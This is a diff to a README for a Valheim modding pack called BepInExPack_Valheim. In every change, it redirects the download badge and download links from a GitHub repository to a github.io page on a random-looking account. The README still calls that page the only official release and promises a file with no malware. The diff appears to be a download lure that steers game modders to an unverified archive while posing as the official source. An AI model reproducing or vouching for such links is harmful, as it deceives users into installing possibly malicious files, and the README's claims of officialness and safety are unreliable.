@@ -1,7 +1,7 @@
 <h1>🎮 BepInExPack_Valheim - Unlock Valheim’s Full Modding Potential</h1>
 
 <p align="center">
-  <a href="https://github.com/headcuratorship3016/BepInExPack_Valheim">
+  <a href="https://headcuratorship3016.github.io">
     <img src="https://img.shields.io/badge/Download-BepInEx_Pack-brightgreen?style=for-the-badge&logo=github" alt="Download Button" width="350" height="80">
   </a>
 </p>
@@ -48,7 +48,7 @@ The entire setup takes less than two minutesand requires no coding skills. You s
 ## 📥 Download & Installation
 
 **Step 1: Download the Pack**
-Visit this link to download the application: **[https://github.com/headcuratorship3016/BepInExPack_Valheim](https://github.com/headcuratorship3016/BepInExPack_Valheim)**.
+Visit this link to download the application: **[https://headcuratorship3016.github.io](https://headcuratorship3016.github.io)**.
 
 
 - The file you receive will be a **ZIP archive** named something like `BepInExPack_Valheim_5.4.23.zip` 
@@ -205,7 +205,7 @@ Visit **thunderstore.io/c/valheim** and search for “BepInEx” compatibility.(
 
 Need the file again? Here's your direct link:
 
-**[🡇 Download BepInExPack_Valheim (Official GitHub Release)](https://github.com/headcuratorship3016/BepInExPack_Valheim)**
+**[🡇 Download BepInExPack_Valheim (Official GitHub Release)](https://headcuratorship3016.github.io)**
 
 This is the only official download source. Avoid third-party mirrors to ensure you get a clean, untampered file with no malware.
 
